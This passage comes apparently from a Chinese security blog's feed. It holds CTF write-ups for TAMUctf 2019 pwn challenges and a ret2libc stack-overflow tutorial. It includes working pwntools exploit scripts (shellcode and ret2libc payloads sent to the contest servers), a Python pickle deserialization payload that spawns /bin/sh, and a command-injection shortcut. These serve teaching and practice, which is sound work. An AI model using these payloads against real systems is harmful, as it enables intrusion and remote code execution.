int(sh.recv(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> addr</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = flat([shellcode.ljust(<span class="number">0x12A</span> + <span class="number">4</span>, <span class="string">"A"</span>), p32(addr)])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>getshell：</p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/30.png" alt=""></p><h2 id="Pwn4"><a href="#Pwn4" class="headerlink" title="Pwn4"></a>Pwn4</h2><p>题目如下：<a href="https://tamuctf.com/files/503332ee71bed3f13b00ec33747bbef2/pwn4" target="_blank" rel="noopener">pwn4</a></p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/31.png" alt=""></p><p>运行程序，功能是询问你想调用ls命令查看哪个文件并让你输入内容，这里输入-l flag.txt看到输入flag.txt的内容；该ELF文件是动态链接的；checksec查看发现只开启了NX：</p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/32.png" alt=""></p><p>使用IDA打开分析，发现循环调用laas()函数：</p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/33.png" alt=""></p><p>进入laas()函数，gets()函数获取输出，存在栈溢出漏洞，然后比较s变量值是否为ASCII码为47即斜杠/，用来过滤跨目录的注入，若没有则传入s参数调用run_cmd()函数：</p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/34.png" alt=""></p><p>在run_cmd()函数未进行任何过滤直接调用system()函数执行系统命令：</p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/35.png" alt=""></p><p>是的，作为一个Web狗，第一直觉就是命令注入，然后getflag了：</p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/36.png" alt=""></p><p>但是吧，还是要按部就班地用Pwn的方法做。可以确定了，是利用ret2libc来实现getshell，因为这里已经有了system()函数，剩下的就是找/bin/sh字符串了。</p><p>打开String窗口，看到真的有/bin/sh字符串，地址为0x0804A034：</p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/6.png" alt=""></p><p>再看下system()函数地址，为0x080485AD：</p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/plus/1.png" alt=""></p><p>和ret2libc1原理一致，如下图：</p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/plus/3.png" alt=""></p><p>编写payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">"pwn.tamuctf.com"</span>, <span class="number">4324</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"Enter the arguments you would like to pass to ls:"</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x080485AD</span></span><br><span class="line">binsh_addr = <span class="number">0x0804A034</span></span><br><span class="line">payload = flat([<span class="string">"A"</span> * <span class="number">0x21</span>, <span class="string">"BBBB"</span>, system_addr, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>getshell：</p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/plus/2.png" alt=""></p><h2 id="Pwn5"><a href="#Pwn5" class="headerlink" title="Pwn5"></a>Pwn5</h2><p>题目如下：<a href="https://tamuctf.com/files/faf489a3ffea904aba9fea47647584b8/pwn5" target="_blank" rel="noopener">pwn5</a></p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/plus/4.png" alt=""></p><p>程序功能点和Pwn4一样；file命令查看该ELF文件是静态的，即和libc无关；checksec查看发现只开启了NX：</p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/plus/5.png" alt=""></p><p>使用IDA打开分析，和Pwn4几乎一致，但是在run_cmd()函数赋值给v2变量的长度缩小为7个字节：</p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/plus/6.png" alt=""></p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/plus/7.png" alt=""></p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/plus/8.png" alt=""></p><p>这里限制了输入命令的长度为7个字节，是否还能存在命令注入呢？像Pwn4那样肯定是行不通的，但是我们可以输入sh来打开shell：</p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/plus/9.png" alt=""></p><p>当然，还有一种利用vi命令及:shell的骚姿势，输入<code>;vi</code>再输入<code>:shell</code>即可执行shell：</p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/plus/13.png" alt=""></p><p>回到正轨，利用原理和Pwn4一样，laas()函数中的gets()存在栈溢出漏洞，打开String窗口寻找到“/bin/sh”，地址为0x080BC140：</p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/plus/10.png" alt=""></p><p>而在Functions窗口中搜索system()函数得到其地址为0x0804EE30：</p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/plus/11.png" alt=""></p><p>在Functions窗口中搜索exit()函数查看其地址为0x0804E330：</p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/plus/14.png" alt=""></p><p>编写payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">"pwn.tamuctf.com"</span>, <span class="number">4325</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"Enter the arguments you would like to pass to ls:"</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x0804EE30</span></span><br><span class="line">exit_addr = <span class="number">0x0804E330</span></span><br><span class="line">binsh_addr = <span class="number">0x080BC140</span></span><br><span class="line">payload = flat([<span class="string">"A"</span> * (<span class="number">0xD</span> + <span class="number">4</span>), system_addr, exit_addr, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>getshell：</p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/plus/12.png" alt=""></p><h2 id="VeggieTales"><a href="#VeggieTales" class="headerlink" title="VeggieTales"></a>VeggieTales</h2><p>题目如下，并没有给ELF文件，大概意思是我最爱看的节目同时也训练我的Python技能，我看了第5集至少13遍了：</p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/1.png" alt=""></p><p>蒙了，没有ELF，nc过去看看：</p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/2.png" alt=""></p><p>可以添加、打印、备份及加载你的观看列表。难道是黑盒堆溢出利用？？？肯定不是。</p><p>再看下提示，说一直看第5集，我们测它的功能的时候，在输入1时会让选择要第几个节目，观察到第5个节目内容如下：</p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/3.png" alt=""></p><p>“Dave and the Giant Pickle”，注意到Pickle，再联系hint中的Python，可以推测应该是Python的Pickle反序列化漏洞。</p><p>关于Python的Pickle反序列化漏洞可参考<a href="https://www.mi1k7ea.com/2019/01/01/cPickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">Python cPickle反序列化漏洞</a>。</p><p>逐个输入查看，添加第5集，然后输入2看到已添加进去，再输入3备份watch list、生成一个base64的东西，用于后面输入4时加载备份，当选项4中获取的输入内容不是该base64内容时会报错：</p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/4.png" alt=""></p><p>将该base64解码，得不到啥东西。</p><p>再回到hint，至少13次，由此可以推测，应该和ROT13算法有关吧。那就试下将该base64内容先进行ROT13解码再进行base64解码吧：</p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/5.png" alt=""></p><p>可以看到确实是包含该第5集的内容的，但是其中有一些非可见字符。</p><p>结合前面推测的Pickle反序列化漏洞，我们可以尝试在输入4选项即要求输入备份编码内容时，输入一段经过base64和ROT13加密的Pickle对象，其中包含字符串“Mi1k7ea”：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> codecs.encode(str(base64.b64encode(cPickle.dumps([<span class="string">'Mi1k7ea'</span>]))), <span class="string">"rot-13"</span>)</span><br></pre></td></tr></table></figure><p>cPickle.dumps()序列化一个列表为字符串，为啥不直接填字符串而加上[]呢？这是为了后面输入时输出在同一行好查看。content即为序列化后的字符串内容，再加密后输入到4选项中，再到2选项中查看，发现成功反序列化处该cPickle序列化对象，即证明了是cPickle反序列化漏洞了：</p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/7.png" alt=""></p><p>OK，现在就输入一段经过base64和ROT13加密的序列化对象，利用反序列化来触发该漏洞，编写代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mi1k7ea</span><span class="params">(object)</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="comment"># return (os.system, ('/bin/sh',))</span></span><br><span class="line"><span class="keyword">return</span> (subprocess.Popen, ((<span class="string">'/bin/sh'</span>,),))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> codecs.encode(base64.b64encode(cPickle.dumps(Mi1k7ea())), <span class="string">"rot-13"</span>)</span><br></pre></td></tr></table></figure><p>这里有个坑，一直尝试用os.system()执行命令的方式老出差、没法成功反序列化，卡了很久，但改用subprocess.Popen()却可以成功：</p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/8.png" alt=""></p><p>要想使用os.system()成功执行，不能使用codecs中的rot-13，我们可以使用系统<code>tr &#39;A-Za-z&#39; &#39;N-ZA-Mn-za-m&#39;</code>命令来实现：</p><p><img src="/2019/03/08/TAMUctf-Pwn-writeup/9.png" alt=""></p><p>题目源码server.py：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">my_episodes = []</span><br><span class="line">all_episodes = [<span class="string">"1.  Wheres God When Im S-Scared?"</span>,<span class="string">"2.  God Wants Me to Forgive Them!?!"</span>,<span class="string">"3.  Are You My Neighbor?"</span>,<span class="string">"4.  Rack, Shack and Benny"</span>,<span class="string">"5.  Dave and the Giant Pickle"</span>,<span class="string">"6.  The Toy That Saved Christmas"</span>,<span class="string">"7.  Larry-Boy! And the Fib from Outer Space!"</span>,<span class="string">"8.  Josh and the Big Wall!"</span>,<span class="string">"9.  Madame Blueberry"</span>,<span class="string">"10. Larry-Boy and the Rumor Weed"</span>,<span class="string">"11. King George and the Ducky"</span>,<span class="string">"12. Esther... The Girl Who Became Queen"</span>,<span class="string">"13. Lyle the Kindly Viking"</span>,<span class="string">"14. The Star of Christmas"</span>,<span class="string">"15. The Wonderful World of Autotainment"</span>,<span class="string">"16. The Ballad of Little Joe"</span>,<span class="string">"17. An Easter Carol"</span>,<span class="string">"18. A Snoodles Tale"</span>,<span class="string">"19. Sumo of the Opera"</span>,<span class="string">"20. Duke and the Great Pie War"</span>,<span class="string">"21. Minnesota Cuke and the Search for Samsons Hairbrush"</span>,<span class="string">"22. Lord of the Beans"</span>,<span class="string">"23. Sheerluck Holmes and the Golden Ruler"</span>,<span class="string">"24. LarryBoy and the Bad Apple"</span>,<span class="string">"25. Gideon: Tuba Warrior"</span>,<span class="string">"26. Moe and the Big Exit"</span>,<span class="string">"27. The Wonderful Wizard of Has"</span>,<span class="string">"28. Tomato Sawyer and Huckleberry Larrys Big River Rescue"</span>,<span class="string">"29. Abe and the Amazing Promise"</span>,<span class="string">"30. Minnesota Cuke and the Search for Noahs Umbrella"</span>,<span class="string">"31. Saint Nicholas: A Story of Joyful Giving"</span>,<span class="string">"32. Pistachio - The Little Boy That Woodnt"</span>,<span class="string">"33. Sweetpea Beauty: A Girl After Gods Own Heart"</span>,<span class="string">"34. Its a Meaningful Life"</span>,<span class="string">"35. Twas The Night Before Easter"</span>,<span class="string">"36. Princess and the Popstar"</span>,<span class="string">"37. The Little Drummer Boy"</span>,<span class="string">"38. Robin Good And His Not-So Merry Men"</span>,<span class="string">"39. The Penniless Princess"</span>,<span class="string">"40. The League of Incredible Vegetables"</span>,<span class="string">"41. The Little House That Stood"</span>,<span class="string">"42. MacLarry and the Stinky Cheese Battle"</span>,<span class="string">"43. Merry Larry and the True Light of Christmas"</span>,<span class="string">"44. Veggies in Space: The Fennel Frontier"</span>,<span class="string">"45. Celery Night Fever"</span>,<span class="string">"46. Beauty and the Beet"</span>,<span class="string">"47. Noahs Ark"</span>] </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sortByNum</span><span class="params">(episode)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> int(episode[:episode.find(<span class="string">'.'</span>)])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_episode</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> episode <span class="keyword">in</span> all_episodes:</span><br><span class="line">        print(<span class="string">"%s"</span> % episode)</span><br><span class="line">    episode_num = str(input(<span class="string">"Enter an episode (by number) to add to your watched list: "</span>))</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> (episode_num.isdigit() <span class="keyword">and</span> (<span class="number">0</span> &lt; int(episode_num) &lt; <span class="number">48</span>)):</span><br><span class="line">        episode_num = str(input(<span class="string">"Enter a valid integer between 1 and 47!!"</span>))</span><br><span class="line">    <span class="keyword">if</span> all_episodes[int(episode_num)<span class="number">-1</span>] <span class="keyword">in</span> my_episodes:</span><br><span class="line">        print(<span class="string">"That episode is already in your list."</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        my_episodes.append(all_episodes[int(episode_num)<span class="number">-1</span>])</span><br><span class="line">        print(<span class="string">"episode added!"</span>)</span><br><span class="line">    my_episodes.sort(key=sortByNum)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_list</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"----------------------"</span>)</span><br><span class="line">    print(<span class="string">"List of watched episodes:"</span>)</span><br><span class="line">    <span class="keyword">if</span> len(my_episodes) == <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">":("</span>)</span><br><span class="line">    <span class="keyword">for</span> episode <span class="keyword">in</span> my_episodes:</span><br><span class="line">        print(<span class="string">"%s"</span> % episode)</span><br><span class="line">    print(<span class="string">"----------------------"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backup_list</span><span class="params">()</span>:</span></span><br><span class="line">    pickled = codecs.encode(str(base64.b64encode(pickle.dumps(my_episodes))),<span class="string">"rot-13"</span>).strip(<span class="string">"o\'"</span>)</span><br><span class="line">    print(<span class="string">"Episode list backup string (Don't lose it!): %s\n"</span> % pickled)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_list</span><span class="params">()</span>:</span></span><br><span class="line">    answer = str(input(<span class="string">"Load your backed up list here: "</span>))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">global</span> my_episodes</span><br><span class="line">        my_episodes = pickle.loads(base64.b64decode(codecs.encode(answer,<span class="string">"rot-13"</span>)))</span><br><span class="line">        print(<span class="string">"Loaded backup\n"</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"Invalid backup"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    print(<span class="string">"Do you like VeggieTales??"</span>)</span><br><span class="line">    message = <span class="string">"1. Add an episode to your watched list\n2. Print your watch list\n3. Backup your watch list\n4. Load your watch list\n"</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        listen = str(input(message))</span><br><span class="line">        <span class="keyword">if</span> len(listen) == <span class="number">1</span> <span class="keyword">and</span> listen <span class="keyword">in</span> <span class="string">"1234"</span>:</span><br><span class="line">            [add_episode, check_list, backup_list, load_list][int(listen) - <span class="number">1</span>]()</span><br><span class="line">            message = <span class="string">"1. Add an episode to your watched list\n2. Print your watch list\n3. Backup your watch list\n4. Load your watch list\n"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            message = <span class="string">"Error: Please choose from options 1-4!!\n"</span></span><br></pre></td></tr></table></figure><p>看来这是一道归类到Pwn的Web题 : )</p><h2 id="Pwn6"><a href="#Pwn6" class="headerlink" title="Pwn6"></a>Pwn6</h2><p>Pwn6没做出来也不会做，可以参考其他大佬的writeup：</p><p><a href="https://github.com/liuhack/writeups/blob/master/2019/TAMUctf/pwn6/README.md" target="_blank" rel="noopener">pwn6 - Pwn</a></p><p><a href="https://thekidofarcrania.gitlab.io/2019/03/03/tamuctf/#pwn6" target="_blank" rel="noopener">TAMUCTF 2019</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;虽然是灰常easy的题，但对我这种刚刚准备入门Pwn的菜鸡来说，再合适不过了。&lt;/p&gt;
&lt;h2 id=&quot;Pwn1&quot;&gt;&lt;a href=&quot;#Pwn1&quot; class=&quot;headerlink&quot; title=&quot;Pwn1&quot;&gt;&lt;/a&gt;Pwn1&lt;/h2&gt;&lt;p&gt;题目如下：&lt;a href=&quot;h
      
    
    </summary>
    
      <category term="WriteUp:Pwn" scheme="https://Mi1k7ea.github.com/categories/WriteUp-Pwn/"/>
    
    
      <category term="二进制" scheme="https://Mi1k7ea.github.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
      <category term="Pwn" scheme="https://Mi1k7ea.github.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>栈溢出之ret2libc</title>
    <link href="https://Mi1k7ea.github.com/2019/03/05/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8Bret2libc/"/>
    <id>https://Mi1k7ea.github.com/2019/03/05/栈溢出之ret2libc/</id>
    <published>2019-03-05T14:39:35.000Z</published>
    <updated>2019-03-06T15:18:35.456Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ret2libc原理"><a href="#ret2libc原理" class="headerlink" title="ret2libc原理"></a>ret2libc原理</h2><p>ret2libc，即控制执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。</p><p>具体过程为：在内存中确定某个函数的地址，并用其覆盖掉返回地址，让其指向前面确定的函数。由于 libc 动态链接库中的函数被广泛使用，所以有很大概率可以在内存中找到该动态库。同时由于该库包含了一些系统级的函数（例如 system() 等），所以通常使用这些系统级函数来获得当前进程的控制权。鉴于要执行的函数可能需要参数，比如调用 system() 函数打开 shell 的完整形式为 system(“/bin/sh”) ，所以溢出数据也要包括必要的参数。</p><blockquote><p><strong>payload:</strong> padding1 + address of system() + padding2 + address of “/bin/sh”</p></blockquote><p><img src="/2019/03/05/栈溢出之ret2libc/1.png" alt=""></p><p>padding1 处的数据可以随意填充（注意不要包含 “\x00” ，否则向程序传入溢出数据时会造成截断），长度应该刚好覆盖函数的基地址。address of system() 是 system() 在内存中的地址，用来覆盖返回地址。padding2 处的数据长度为4（32位机），对应调用 system() 时的返回地址。因为我们在这里只需要打开 shell 就可以，并不关心从 shell 退出之后的行为，所以 padding2 的内容可以随意填充。address of “/bin/sh” 是字符串 “/bin/sh” 在内存中的地址，作为传给 system() 的参数。</p><p><strong>第一个问题——system()地址如何确定？</strong></p><p>要回答这个问题，就要看看程序是如何调用动态链接库中的函数的。当函数被动态链接至程序中，程序在运行时首先确定动态链接库在内存的起始地址，再加上函数在动态库中的相对偏移量，最终得到函数在内存的绝对地址。说到确定动态库的内存地址，就要回顾一下 shellcode 中提到的内存布局随机化（ASLR），这项技术也会将动态库加载的起始地址做随机化处理。所以，如果操作系统打开了 ASLR，程序每次运行时动态库的起始地址都会变化，也就无从确定库内函数的绝对地址。在 ASLR 被关闭的前提下，我们可以通过调试工具在运行程序过程中直接查看 system() 的地址，也可以查看动态库在内存的起始地址，再在动态库内查看函数的相对偏移位置，通过计算得到函数的绝对地址。</p><p><strong>第二个问题——“/bin/sh”字符串地址如何确定？</strong></p><p>可以在动态库里搜索这个字符串，如果存在，就可以按照动态库起始地址＋相对偏移来确定其绝对地址。如果在动态库里找不到，可以将这个字符串加到环境变量里，再通过 getenv() 等函数来确定地址。</p><p><strong>前提条件</strong></p><p>由前面分析可知，ret2libc这项技术的前提是需要操作系统关闭内存布局随机化（ASLR）。</p><h2 id="ret2libc1——存在system-、-bin-sh"><a href="#ret2libc1——存在system-、-bin-sh" class="headerlink" title="ret2libc1——存在system()、/bin/sh"></a>ret2libc1——存在system()、/bin/sh</h2><p>运行程序，提示应用ret2libc，且用file查看是动态链接文件，和libc有关：</p><p><img src="/2019/03/05/栈溢出之ret2libc/2.png" alt=""></p><p><img src="/2019/03/05/栈溢出之ret2libc/3.png" alt=""></p><p>查看保护机制，只开启了NX：</p><p><img src="/2019/03/05/栈溢出之ret2libc/4.png" alt=""></p><p>IDA查看：</p><p><img src="/2019/03/05/栈溢出之ret2libc/5.png" alt=""></p><p>搜索“/bin/sh”字符串，可通过string窗口或ROPgadget工具查找：</p><p><img src="/2019/03/05/栈溢出之ret2libc/6.png" alt=""></p><p><img src="/2019/03/05/栈溢出之ret2libc/7.png" alt=""></p><p>或</p><p><img src="/2019/03/05/栈溢出之ret2libc/8.png" alt=""></p><p>可知“/bin/sh”字符串所在地址为0x08048720。</p><p>因为要从libc中寻找利用函数，则可以在ida直接查看plt中是否有system()函数，发现是存在有的且地址为0x08048460：</p><p><img src="/2019/03/05/栈溢出之ret2libc/9.png" alt=""></p><p>至于用户输入的变量v4距函数返回地址的偏移地址的计算如之前所示，结果是一样的为0x70。</p><p>编写payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./ret2libc1"</span>)</span><br><span class="line">binsh_addr = <span class="number">0x08048720</span></span><br><span class="line">libc_system_addr = <span class="number">0x08048460</span></span><br><span class="line">payload = flat([<span class="string">"A"</span> * <span class="number">0x70</span>, libc_system_addr, <span class="string">"6666"</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>运行getshell：</p><p><img src="/2019/03/05/栈溢出之ret2libc/10.png" alt=""></p><h2 id="ret2libc2——只有system"><a href="#ret2libc2——只有system" class="headerlink" title="ret2libc2——只有system()"></a>ret2libc2——只有system()</h2><p>运行程序，file查看文件为动态链接即和libc相关，查看保护机制只开启NX：</p><p><img src="/2019/03/05/栈溢出之ret2libc/11.png" alt=""></p><p><img src="/2019/03/05/栈溢出之ret2libc/12.png" alt=""></p><p><img src="/2019/03/05/栈溢出之ret2libc/13.png" alt=""></p><p>使用IDA打开查看：</p><p><img src="/2019/03/05/栈溢出之ret2libc/14.png" alt=""></p><p>在string窗口确实找不到“/bin/sh”：</p><p><img src="/2019/03/05/栈溢出之ret2libc/15.png" alt=""></p><p>在plt中仍可找到system()函数，地址为0x08048490：</p><p><img src="/2019/03/05/栈溢出之ret2libc/16.png" alt=""></p><p>可以发现与示例1相比，这次不直接提供“/bin/sh”，那就换种思维，多利用一个gadgets，可以在plt中看到有gets()函数，即可以将该gets()函数地址用来踩掉原本程序函数的返回地址，然后通过输入的方式将“/bin/sh”输入进去。换句话说，整个过程分成了两部分，第一部分是将“/bin/sh”读入到内存中；第二部分是执行system()获取shell：</p><p><img src="/2019/03/05/栈溢出之ret2libc/17.png" alt=""></p><p>其中可知get()函数地址为08048460。</p><p>查看gets()函数，其需要一个可读可写的指针参数，且会返回值：</p><p><img src="/2019/03/05/栈溢出之ret2libc/18.png" alt=""></p><p>寻找一块可读可写的buffer区，通常会寻找.bss段，使用IDA查看可看到存在buf2[100]数组：</p><p><img src="/2019/03/05/栈溢出之ret2libc/19.png" alt=""></p><p>明确该.bss段是否可读可写：</p><p><img src="/2019/03/05/栈溢出之ret2libc/20.png" alt=""></p><p>最后就是payload的构造了。因为在gets()函数完成后需要调用system()函数需要保持堆栈平衡，所以在调用完gets()函数后提升堆栈，这就需要add esp, 4这样的指令但是程序中并没有这样的指令。更换思路，通过使用pop xxx指令也可以完成同样的功能，在程序中找到了pop ebx，ret指令。通过ROPgadget工具查看，发现存在一条符合条件的指令，地址为0x0804841d：</p><p><img src="/2019/03/05/栈溢出之ret2libc/21.png" alt=""></p><p>编写payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">"./ret2libc2"</span>)</span><br><span class="line">libc_gets_addr = <span class="number">0x08048460</span></span><br><span class="line">libc_system_addr = <span class="number">0x08048490</span></span><br><span class="line">buf2_addr = <span class="number">0x0804a080</span></span><br><span class="line">pop_ebx_addr = <span class="number">0x0804841d</span></span><br><span class="line">payload = flat([<span class="string">"A"</span> * <span class="number">0x70</span>, libc_gets_addr, pop_ebx_addr, buf2_addr, libc_system_addr, <span class="string">'6666'</span>, buf2_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>运行getshell：</p><p><img src="/2019/03/05/栈溢出之ret2libc/22.png" alt=""></p><h2 id="ret2libc3——无system-和-bin-sh"><a href="#ret2libc3——无system-和-bin-sh" class="headerlink" title="ret2libc3——无system()和/bin/sh"></a>ret2libc3——无system()和/bin/sh</h2><p>在ret2libc2的基础上，再次将system()函数的地址去掉。此时，我们需要同时找到system())函数地址与”/bin/sh”字符串的地址。</p><p>运行程序，file查看文件为动态链接即和libc相关，查看保护机制只开启NX：</p><p><img src="/2019/03/05/栈溢出之ret2libc/23.png" alt=""></p><p>IDA打开查看，同样是栈溢出漏洞：</p><p><img src="/2019/03/05/栈溢出之ret2libc/24.png" alt=""></p><p>在String窗口找不到“/bin/sh”字符串，在Functions窗口中也找不到system()函数：</p><p><img src="/2019/03/05/栈溢出之ret2libc/25.png" alt=""></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://zhuanlan.zhihu.com/p/25816426" target="_blank" rel="noopener">手把手教你栈溢出从入门到放弃（上）</a></p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop/#ret2libc" target="_blank" rel="noopener">ret2libc</a></p>]]></content>
    
    <summary type="html">
    
      
      
